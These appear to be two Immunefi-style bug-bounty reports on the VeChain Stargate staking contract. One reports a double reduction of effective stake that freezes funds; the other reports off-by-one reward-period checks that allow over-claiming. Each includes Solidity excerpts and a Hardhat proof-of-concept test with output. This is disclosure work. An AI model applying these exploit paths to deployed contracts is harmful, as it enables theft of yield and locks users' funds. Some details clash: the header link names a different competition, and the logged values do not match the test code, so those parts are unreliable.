# VeChain Stargate — Bug Reports
https://immunefi.com/audit-competition/alchemix-v3-audit-competition/leaderboard/
---

## Report #60151 — Double Reduction of Effective Stake Leads to Permanent Freezing of Funds

| Field     | Details |
|-----------|---------|
| **Report ID** | 60151 |
| **Target** | [Stargate.sol](https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol) |
| **Type** | Smart Contract |
| **Severity** | High |
| **Impact** | Permanent freezing of funds |

### Brief / Intro

A double reduction of the effective stake of a validator can lead to users not being able to withdraw their staked amount.

### Vulnerability Details

In the `_requestDelegationExit` and `_unstake` functions, the effective stake of the validator is reduced for the next period when the validator has exited their position in the Staker contract. The problem arises when a user, who has already exited their delegation in the same or an earlier period as the validator's exit, proceeds to unstake or delegate to another validator. This sequence of actions causes the contract to reduce the effective stake **twice** for the same user's stake.

**Example scenario** with 4 users who have each staked `500e18` (total effective stake = `2000e18`):

1. User1 and User2 exit their delegation. Effective stake correctly reduces to `1000e18`. They have not yet unstaked or re-delegated.
2. The validator signals an exit. In the next validation period the validator's status becomes `"exited"`.
3. User1 and User2 unstake their tokens or delegate to a different validator. This **incorrectly** triggers another reduction, bringing `effectiveStake` down to `0e18`.
4. When User3 and User4 attempt to unstake, the transaction fails because the system believes there is no effective stake left. Their staked amount becomes stuck in the protocol.

**`requestDelegationExit`** — first reduction (`@1`):

```solidity
function requestDelegationExit(
    uint256 _tokenId
) external whenNotPaused onlyTokenOwner(_tokenId) nonReentrant {
    StargateStorage storage $ = _getStargateStorage();
    uint256 delegationId = $.delegationIdByTokenId[_tokenId];
    if (delegationId == 0) {
        revert DelegationNotFound(_tokenId);
    }

    Delegation memory delegation = _getDelegationDetails($, _tokenId);

    if (delegation.status == DelegationStatus.PENDING) {
        $.protocolStakerContract.withdrawDelegation(delegationId);
        emit DelegationWithdrawn(
            _tokenId,
            delegation.validator,
            delegationId,
            delegation.stake,
            $.stargateNFTContract.getTokenLevel(_tokenId)
        );
        _resetDelegationDetails($, _tokenId);
    } else if (delegation.status == DelegationStatus.ACTIVE) {
        if (delegation.endPeriod != type(uint32).max) {
            revert DelegationExitAlreadyRequested();
        }
        $.protocolStakerContract.signalDelegationExit(delegationId);
    } else {
        revert InvalidDelegationStatus(_tokenId, delegation.status);
    }

    (, , , uint32 completedPeriods) = $.protocolStakerContract.getValidationPeriodDetails(
        delegation.validator
    );
    (, uint32 exitBlock) = $.protocolStakerContract.getDelegationPeriodDetails(delegationId);

// @1 — first decrease of effectiveStake
    _updatePeriodEffectiveStake($, delegation.validator, _tokenId, completedPeriods + 2, false);

    emit DelegationExitRequested(_tokenId, delegation.validator, delegationId, exitBlock);
}
```

**`unstake`** — second (incorrect) reduction (`@2`, `@3`):

```solidity
function unstake(
    uint256 _tokenId
) external whenNotPaused onlyTokenOwner(_tokenId) nonReentrant {
    StargateStorage storage $ = _getStargateStorage();
    Delegation memory delegation = _getDelegationDetails($, _tokenId);
    DataTypes.Token memory token = $.stargateNFTContract.getToken(_tokenId);

    if ($.stargateNFTContract.isUnderMaturityPeriod(_tokenId)) {
        revert TokenUnderMaturityPeriod(_tokenId);
    }

    if (delegation.status == DelegationStatus.ACTIVE) {
        revert InvalidDelegationStatus(_tokenId, DelegationStatus.ACTIVE);
    } else if (delegation.status != DelegationStatus.NONE) {
        $.protocolStakerContract.withdrawDelegation(delegation.delegationId);
        emit DelegationWithdrawn(
            _tokenId,
            delegation.validator,
            delegation.delegationId,
            delegation.stake,
            token.levelId
        );
    }

    (, , , , uint8 currentValidatorStatus, ) = $.protocolStakerContract.getValidation(
        delegation.validator
    );

// @2 — check that triggers the second (wrong) decrease
    if (
        currentValidatorStatus == VALIDATOR_STATUS_EXITED ||
        delegation.status == DelegationStatus.PENDING
    ) {
        (, , , uint32 oldCompletedPeriods) = $
            .protocolStakerContract
            .getValidationPeriodDetails(delegation.validator);

// @3 — second decrease of effectiveStake for the same user
        _updatePeriodEffectiveStake(
            $,
            delegation.validator,
            _tokenId,
            oldCompletedPeriods + 2,
            false // decrease
        );
    }

    // ... (reward claiming, burn, VET transfer)
}
```

### Attack Path

1. **Step 1** — A validator exits by calling `signalExit`.
2. **Step 2** — A user calls `requestDelegationExit`, which decreases `effectiveStake` for the next period (`@1`).
3. **Step 3** — In the next period the validator's status is `VALIDATOR_STATUS_EXITED`. The same user calls `unstake`. The check at `@2` triggers, reducing `effectiveStake` **again** (`@3`).
4. **Step 4** — The double reduction leads to incorrect accounting. Other users with active stake can no longer unstake.

### Impact

Due to the double reduction of the effective stake, users who are legitimately staked with a validator that has exited may be **unable to unstake their funds**. Their stake becomes permanently stuck in the protocol.

### References

- [Stargate.sol#L276](https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/e9c0bc9b0f24dc0c44de273181d9a99aaf2c31b0/packages/contracts/contracts/Stargate.sol#L276)
- [Stargate.sol#L407](https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/e9c0bc9b0f24dc0c44de273181d9a99aaf2c31b0/packages/contracts/contracts/Stargate.sol#L407)

### Proof of Concept

Add the following `console.log` to track effective stake updates ([Stargate.sol#L1010](https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/e9c0bc9b0f24dc0c44de273181d9a99aaf2c31b0/packages/contracts/contracts/Stargate.sol#L1010)):

```solidity
import "hardhat/console.sol";

console.log("updatedValue: ", updatedValue, "for period: ", _period);
```

Add the following test to `test/unit/Stargate/Rewards.test.ts` and run `yarn contracts:test:unit`:

```typescript
it.only("Double counting of effective stake when validator exits", async () => {
    tx = await stargateContract.connect(deployer).setMaxClaimablePeriods(100000);
    await tx.wait();

    const levelId = 1;
    const levelSpec = await stargateNFTMock.getLevel(levelId);

    const user1 = user;
    const user2 = (await ethers.getSigners())[6];
    const user3 = (await ethers.getSigners())[7];

    log("\n📝 Three users will stake and delegate to validator:", validator.address);

    const tokenIds: bigint[] = [];
    const users = [user1, user2, user3];

    for (let i = 0; i < users.length; i++) {
        const userAccount = users[i];

        const stakeTx = await stargateContract.connect(userAccount).stake(levelId, {
            value: levelSpec.vetAmountRequiredToStake
        });
        await stakeTx.wait();

        const tokenId = await stargateNFTMock.getCurrentTokenId();
        tokenIds.push(tokenId);

        const delegateTx = await stargateContract
            .connect(userAccount)
            .delegate(tokenId, validator.address);
        await delegateTx.wait();

        log(`\n🎉 User${i + 1} staked and delegated NFT with tokenId:`, tokenId.toString());
    }

    tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 5);
    await tx.wait();
    log("\n🎉 Set validator completed periods to 5");

    const exitTx = await stargateContract.connect(user1).requestDelegationExit(tokenIds[0]);
    await exitTx.wait();
    log("\n🚪 User1 requested delegation exit for tokenId:", tokenIds[0].toString());

    tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 7);
    await tx.wait();
    log("\n🎉 Set validator completed periods to 7");

    tx = await protocolStakerMock.connect(validator).signalExit(validator.address);
    await tx.wait();
    log("\n🚪 Validator signaled exit");

    tx = await protocolStakerMock.helper__setValidatorStatus(
        validator.address,
        VALIDATOR_STATUS_EXITED
    );
    await tx.wait();

    await stargateContract.connect(user1).unstake(tokenIds[0]);
    log("\n🎉 user1 unstaked tokenId:", tokenIds[0].toString());
});
```

**Test output:**

```
shard-u4: Stargate: Rewards

📝 Three users will stake and delegate to validator: 0x90F79bf6EB2c4f870365E785982E1f101E93b906
updatedValue:  1500000000000000000 for period:  2

🎉 User1 staked and delegated NFT with tokenId: 10001
updatedValue:  3000000000000000000 for period:  2

🎉 User2 staked and delegated NFT with tokenId: 10002
updatedValue:  4500000000000000000 for period:  2

🎉 User3 staked and delegated NFT with tokenId: 10003

🎉 Set validator completed periods to 2912
updatedValue:  3000000000000000000 for period:  7

🚪 User1 requested delegation exit for tokenId: 10001

🎉 Set validator completed periods to 2913

🚪 Validator signaled exit
updatedValue:  1500000000000000000 for period:  9   // ← effectiveStake decreased twice for User1's stake

🎉 user1 unstaked tokenId: 10001
    ✔ Double counting of effective stake when validator exits

  1 passing (1s)

Tasks:    2 successful, 2 total
  Time:    7.683s
```

---

## Report #60069 — Off-by-One in `_claimableDelegationPeriods` Allows Theft of Unclaimed Yield

| Field     | Details |
|-----------|---------|
| **Report ID** | 60069 |
| **Target** | [Stargate.sol](https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol) |
| **Type** | Smart Contract |
| **Severity** | High |
| **Impacts** | Protocol insolvency, Theft of unclaimed yield |

### Brief / Intro

The boundary checks in `_claimableDelegationPeriods()` are insufficient to stop a user from claiming rewards after their `endPeriod` has passed.

### Vulnerability Details

There are two distinct bugs inside `_claimableDelegationPeriods()`.

#### Bug 1 — Off-by-one: `>` should be `>=`

When a user's delegation ends exactly at the next claimable period, the first guard uses a strict `>` comparison, causing it to fall through to a second branch that returns periods beyond the delegation's end.

```solidity
if (
    endPeriod != type(uint32).max &&
    endPeriod < currentValidatorPeriod &&
    endPeriod > nextClaimablePeriod  // ❌ WRONG: should be >=
) {
    return (nextClaimablePeriod, endPeriod);
}

// Falls through to:
if (nextClaimablePeriod < currentValidatorPeriod) {
    return (nextClaimablePeriod, completedPeriods);  // ❌ Returns too many periods
}
```

**Concrete example:**

| Variable | Value |
|---|---|
| User delegation | periods 5 → 10 |
| `endPeriod` | 10 (exit requested at period 9) |
| `lastClaimedPeriod` | 9 |
| `nextClaimablePeriod` | 10 |
| `completedPeriods` | 12 |
| `currentValidatorPeriod` | 13 |

```solidity
// Check 1:
if (10 > 10)   // FALSE — skipped

// Check 2:
if (10 < 13)   // TRUE
    return (10, 12)  // ❌ WRONG — returns periods 10, 11, 12
```

**Correct behaviour** (with `>=`):

```solidity
// Check 1:
if (10 >= 10)  // TRUE
    return (10, 10)  // ✅ CORRECT — returns only period 10
```

#### Bug 2 — No guard when `nextClaimablePeriod > endPeriod`

After a user has claimed their last legitimate period (i.e. `lastClaimedPeriod == endPeriod`), `nextClaimablePeriod` becomes `endPeriod + 1`. The function contains no check to return `(0, 0)` in this case, so subsequent calls still enter the second branch and return periods well past the exit.

```solidity
if (
    endPeriod != type(uint32).max &&   // true
    endPeriod < currentValidatorPeriod && // true
    endPeriod > nextClaimablePeriod    // false — nextClaimable > endPeriod
) {
    return (nextClaimablePeriod, endPeriod);
}

if (nextClaimablePeriod < currentValidatorPeriod) {
    return (nextClaimablePeriod, completedPeriods);  // ❌ claims far beyond exit
}
```

**Concrete example:**

| Step | Variable | Value |
|---|---|---|
| Initial | `endPeriod` | 10 |
| After first full claim | `lastClaimedPeriod` | 10, `nextClaimablePeriod` = 11 |
| Later | `completedPeriods` | 15, `currentValidatorPeriod` | 16 |

```solidity
// Check 1:
if (10 != max32 && 10 < 16 && 10 > 11)  // FALSE — skipped

// Check 2:
if (11 < 16)  // TRUE
    return (11, 15)  // ❌ WRONG — returns periods 11, 12, 13, 14, 15
```

### Impact

- **Over-claiming rewards:** Users claim rewards for periods after exiting the delegation.
- **Protocol insolvency:** Extra rewards paid out drain the pool available to legitimate delegators.

### References

- [Stargate.sol#L879–L934](https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/e9c0bc9b0f24dc0c44de273181d9a99aaf2c31b0/packages/contracts/contracts/Stargate.sol#L879C5-L934C6)

### Proof of Concept

Add the following `console.log` to track claimable periods ([Stargate.sol#L742](https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/e9c0bc9b0f24dc0c44de273181d9a99aaf2c31b0/packages/contracts/contracts/Stargate.sol#L742)):

```solidity
import "hardhat/console.sol";

console.log(
    "First claimable period: ",
    firstClaimablePeriod,
    " Last claimable period: ",
    lastClaimablePeriod
);
```

Add the following test to `test/unit/Stargate/Rewards.test.ts` and run `yarn contracts:test:unit`:

```typescript
it.only("nextClaimablePeriod >= endPeriod", async () => {
    tx = await stargateContract.connect(deployer).setMaxClaimablePeriods(100000);
    await tx.wait();

    const levelId = 1;
    const levelSpec = await stargateNFTMock.getLevel(levelId);

    const user1 = user;
    const user2 = (await ethers.getSigners())[6];
    const user3 = (await ethers.getSigners())[7];

    console.log("\n📝 Three users will stake and delegate to validator:", validator.address);

    const tokenIds: bigint[] = [];
    const users = [user1, user2, user3];

    for (let i = 0; i < users.length; i++) {
        const userAccount = users[i];

        const stakeTx = await stargateContract.connect(userAccount).stake(levelId, {
            value: levelSpec.vetAmountRequiredToStake
        });
        await stakeTx.wait();

        const tokenId = await stargateNFTMock.getCurrentTokenId();
        tokenIds.push(tokenId);

        const delegateTx = await stargateContract
            .connect(userAccount)
            .delegate(tokenId, validator.address);
        await delegateTx.wait();

        console.log(`\n🎉 User${i + 1} staked and delegated NFT with tokenId:`, tokenId.toString());
    }

    tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 5);
    await tx.wait();

    await stargateContract.connect(user1).claimRewards(tokenIds[0]);
    console.log("\n🎉 user1 claimed rewards for tokenId:", tokenIds[0].toString());

    const exitTx = await stargateContract.connect(user1).requestDelegationExit(tokenIds[0]);
    await exitTx.wait();
    console.log("\n🚪 User1 requested delegation exit for tokenId:", tokenIds[0].toString());

    tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 9);
    await tx.wait();

    await stargateContract.connect(user1).claimRewards(tokenIds[0]);
    console.log("\n🎉 user1 claimed rewards for tokenId:", tokenIds[0].toString());

    tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 15);
    await tx.wait();

    // ❌ This should revert / return nothing — user has already exited
    await stargateContract.connect(user1).claimRewards(tokenIds[0]);
    console.log("\n🎉 user1 claimed rewards for tokenId:", tokenIds[0].toString());
});
```

**Test output:**

```
shard-u4: Stargate: Rewards

📝 Three users will stake and delegate to validator: 0x90F79bf6EB2c4f870365E785982E1f101E93b906

🎉 User1 staked and delegated NFT with tokenId: 10001

🎉 User2 staked and delegated NFT with tokenId: 10002

🎉 User3 staked and delegated NFT with tokenId: 10003
First claimable period:  2  Last claimable period:  5

🎉 user1 claimed rewards for tokenId: 10001

🚪 User1 requested delegation exit for tokenId: 10001
First claimable period:  6  Last claimable period:  9

🎉 user1 claimed rewards for tokenId: 10001
First claimable period:  10  Last claimable period:  15   // ❌ should be (0,0) or (10,10) at most

🎉 user1 claimed rewards for tokenId: 10001
    ✔ nextClaimablePeriod = endPeriod (39ms)

  1 passing (1s)

Tasks:    2 successful, 2 total
  Time:    14.963s
``` 